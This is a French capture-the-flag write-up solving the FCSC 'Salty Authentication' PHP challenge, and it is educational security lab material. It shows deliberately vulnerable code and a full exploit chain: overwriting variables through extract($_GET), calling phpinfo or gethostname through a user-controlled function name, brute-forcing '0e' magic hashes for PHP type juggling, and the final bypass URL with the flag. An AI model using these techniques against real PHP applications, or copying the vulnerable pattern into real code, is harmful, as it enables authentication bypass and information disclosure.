# Salty Authentication

<img alt="énoncé du challenge" src="énoncé.png" width=300>

L'URL affiche visiblement le code source de la page PHP servie :
```php
<?php

error_reporting(0);

include('flag.php');
$salt = bin2hex(random_bytes(12));

extract($_GET);

$secret = gethostname() . $salt;

if (isset($password) && strlen($password) === strlen($secret) && $password !== $secret) {
    if (hash('fnv164', $password) == hash('fnv164', $secret)) {
        exit(htmlentities($flag));
    } else {
        echo('Wrong password!');
        exit($log_attack());
    }
}

highlight_file(__FILE__);

?>
```

L'instruction `extract($_GET)` permet de définir `$password` et `$salt` à partir des query params présents dans la requête GET. On remarque au passage, qu'on peut ainsi écraser la valeur de `$salt` définie juste avant.

Pour trouver la taille du `hostname`, on va donc fournir un `salt` vide (i.e. `salt=`) dans la requête, et appeler plusieurs fois l'URL avec un `password` de taille différente, jusqu'à ce que le message `Wrong password!` s'affiche.

https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password=123456789012, permet d'y arriver. Par conséquent, le `hostname` est sur 12 caractères.

On voit que cette branche se finit par l'instruction `exit($log_attack())`. Or si le paramètre de `exit()` est une chaîne de caractères, alors celle-ci s'affichera.

Comme on l'a fait pour `$salt` et `$password`, il est possible de définir `$log_attack` via les query params de la requête GET. Il faut juste trouver une méthode sans paramètre, et qui renvoie une chaîne de caractères si on souhaite en visualiser le résultat.

En 1ère approche, on peut utiliser `phpinfo` : https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password=123456789012&log_attack=phpinfo

On récupère ainsi le `hostname` qui vaut `9be4a60f645f`.

On obtient la même chose, plus directement en utilisant `gethostname` : https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password=123456789012&log_attack=gethostname.

Le résultat est alors le suivant :
```html
Wrong password!9be4a60f645f
```

Mais on ne peut pas utiliser directement cette valeur comme `password` à cause de la condition : `$password !== $secret` qui doit être vérifiée.

Il faut maintenant faire en sorte que les 2 conditions suivantes sont vérifiées simultanément :
```php
$password !== $secret
hash('fnv164', $password) == hash('fnv164', $secret)
```

Pour cela on compte sur le "type juggling" en PHP.
On note notamment qu'une chaine au format `0e{suite de chiffres}` est évaluée en tant que nombre `0`.
On a notamment la condition suivante qui est vérifiée : `"0e12345" == "0e54321" == 0`.

Il ne reste plus qu'à trouver 2 chaînes de caractères commençant par `9be4a60f645f`, dont le hash donnera une valeur au format `0e{suite de chiffres}`

Voici la boucle utilisée pour en trouver :

```php
for ($i=0; $i<100000; $i++) {
    $hi = "9be4a60f645f" . sprintf("%0*x", $i, 2);
    echo $i . "=>" . hash('fnv164', $hi) . "<br>";
}
```

Quelques résultats intéressants :
```
100=>0ed5ebd524b000b1
247=>0e22b16f55952783
818=>0eeb6b2181d75479
825=>0ef22cae0fb5d62b
1358=>0e5d0cfa55d6bde9
1759=>0e1e6f2317e77ca3
2333=>0e6322324361cc7b
...
25410=>0e44355010641f39
30412=>0e87791831206851
```

Le hash obtenu avec `$i=30412` remplit toute les conditions. Malheureusement si on utilise cette valeur `9be4a60f645f . '0' x 30412` on obtient un code HTTP 400 : surement une protection contre les requêtes trop longues.

On se rabbat sur le hash obtenu avec `$i=2333` qui correspond presque (seul les 4 derniers caractères ne sont pas tous des chiffres). Dans ce cas, la requête passe (i.e. on n'a pas un retour HTTP en 400).
On cherche donc des valeurs proches de `9be4a60f645f . '0' x 2333` qui permettent d'obtenir un hash "parfait".

On en obtient 2 avec :

```php
$h1 = "9be4a60f645f" . sprintf("%0*x", 2333, 246);
$hash1 = hash('fnv164', $h1);
echo "\$hash1 = " . $hash1 . "<br>";

$h2 = "9be4a60f645f" . sprintf("%0*x", 2333, 247);
$hash2 = hash('fnv164', $h2);
echo "\$hash2 = " . $hash2 . "<br>";
```

> ```php
> $hash1 = 0e63543243622109
> $hash2 = 0e63543243622108
> ```

On va donc réaliser l'appel avec par exemple :

```php
$password = "9be4a60f645f" . sprintf("%0*x", 2333, 246);
$salt = sprintf("%0*x", 2333, 247);
```

Et ainsi obtenir le flag : `FCSC{d090643090b9ac9dd7cddc1d830f0457213e5b50e7a59f1fe493df69c60ac054}`

<details>
    <summary>Requête complète utilisée :</summary>
http://salty-authentication.france-cybersecurity-challenge.fr/?password=9be4a60f645f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f6&salt=000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f7
</details>
